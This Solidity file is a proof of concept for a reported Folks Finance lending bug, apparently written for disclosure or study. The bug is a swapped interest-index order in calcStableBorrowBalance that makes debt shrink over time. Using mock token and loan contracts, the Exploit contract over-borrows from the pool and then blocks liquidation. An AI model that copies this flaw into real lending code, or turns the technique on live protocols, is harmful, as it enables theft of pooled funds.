// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Folks Finance — getLoanLiquidity (Immunefi 34122, August 2024)
    calcStableBorrowBalance passes the stored index first and the updated index
    second. calcBorrowBalance expects (balance, newIndex, oldIndex), so a year
    of stable interest shrinks the debt. The loan looks over-collateralized and
    the borrower draws more of the pool.
*/

library MathUtils {
    uint256 internal constant ONE_18_DP = 1e18;

    function calcBorrowBalance(
        uint256 borrowBalanceAtTn_1,
        uint256 borrowInterestIndexAtT,
        uint256 borrowInterestIndexAtTn_1
    ) internal pure returns (uint256) {
        return ceilDiv(borrowBalanceAtTn_1 * ceilDiv(borrowInterestIndexAtT * ONE_18_DP, borrowInterestIndexAtTn_1), ONE_18_DP);
    }

    function ceilDiv(uint256 a, uint256 d) internal pure returns (uint256) {
        uint256 q = a / d;
        if (a % d != 0) q += 1;
        return q;
    }

    function calcBorrowInterestIndex(uint256 rate, uint256 index, uint256 delta) internal pure returns (uint256) {
        uint256 year = 365 days;
        return index + (index * rate / ONE_18_DP) * delta / year;
    }
}

using MathUtils for uint256;

contract USD {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error OverCollateralizedLoan(address user);

contract LoanManager {
    USD public immutable usd;
    bool public immutable correctOrder;

    struct Borrow {
        uint256 balance;
        uint256 lastInterestIndex;
        uint256 stableInterestRate;
        uint256 lastStableUpdateTimestamp;
    }

    mapping(address => Borrow) public borrows;
    mapping(address => uint256) public collateralValue;

    constructor(USD _usd, bool _correctOrder) {
        usd = _usd;
        correctOrder = _correctOrder;
    }

    function open(address user, uint256 principal, uint256 collateral, uint256 rate) external {
        // Stored elapsed time, not a timestamp, so the year of interest does not depend on the block clock.
        borrows[user] = Borrow(principal, 1e18, rate, 365 days);
        collateralValue[user] = collateral;
    }

    function calcStableBorrowBalance(uint256 balance, uint256 loanInterestIndex, uint256 loanInterestRate, uint256 stableBorrowChangeDelta)
        public
        view
        returns (uint256)
    {
        uint256 stableBorrowInterestIndex = MathUtils.calcBorrowInterestIndex(loanInterestRate, loanInterestIndex, stableBorrowChangeDelta);
        if (correctOrder) {
            return balance.calcBorrowBalance(stableBorrowInterestIndex, loanInterestIndex);
        }
        // @> VULN: loanInterestIndex is the old index, so calcBorrowBalance divides the debt by the updated index
        return balance.calcBorrowBalance(loanInterestIndex, stableBorrowInterestIndex);
    }

    function debtOf(address user) public view returns (uint256) {
        Borrow memory b = borrows[user];
        return calcStableBorrowBalance(b.balance, b.lastInterestIndex, b.stableInterestRate, b.lastStableUpdateTimestamp);
    }

    function trueDebtOf(address user) public view returns (uint256) {
        Borrow memory b = borrows[user];
        uint256 stableBorrowInterestIndex =
            MathUtils.calcBorrowInterestIndex(b.stableInterestRate, b.lastInterestIndex, b.lastStableUpdateTimestamp);
        return b.balance.calcBorrowBalance(stableBorrowInterestIndex, b.lastInterestIndex);
    }

    function borrow(uint256 amount) external returns (uint256) {
        uint256 debt = debtOf(msg.sender);
        require(collateralValue[msg.sender] >= debt + amount, "over");
        borrows[msg.sender].balance += amount;
        require(usd.transfer(msg.sender, amount), "pay");
        return amount;
    }

    function liquidate(address user) external {
        if (collateralValue[user] >= debtOf(user)) revert OverCollateralizedLoan(user);
        collateralValue[user] = 0;
    }
}

contract Exploit {
    USD public usd;
    LoanManager public loans;
    uint256 public wrongDebt;
    uint256 public trueDebt;
    uint256 public drawn;
    bool public liquidationReverted;

    constructor() {
        usd = new USD();
        loans = new LoanManager(usd, false);
        usd.mint(address(loans), 200 ether);
        loans.open(address(this), 100 ether, 150 ether, 1e18);
    }

    function run() external {
        wrongDebt = loans.debtOf(address(this));
        trueDebt = loans.trueDebtOf(address(this));
        drawn = loans.borrow(80 ether);
        (bool ok,) = address(loans).call(abi.encodeWithSignature("liquidate(address)", address(this)));
        liquidationReverted = !ok;
        require(wrongDebt == 50 ether, "wrong");
        require(trueDebt == 200 ether, "true");
        require(drawn == 80 ether, "drawn");
        require(usd.balanceOf(address(this)) == 80 ether, "received");
        require(liquidationReverted, "liq");
        require(loans.collateralValue(address(this)) == 150 ether, "collateral");
        require(usd.balanceOf(address(loans)) == 120 ether, "pool");
    }
}
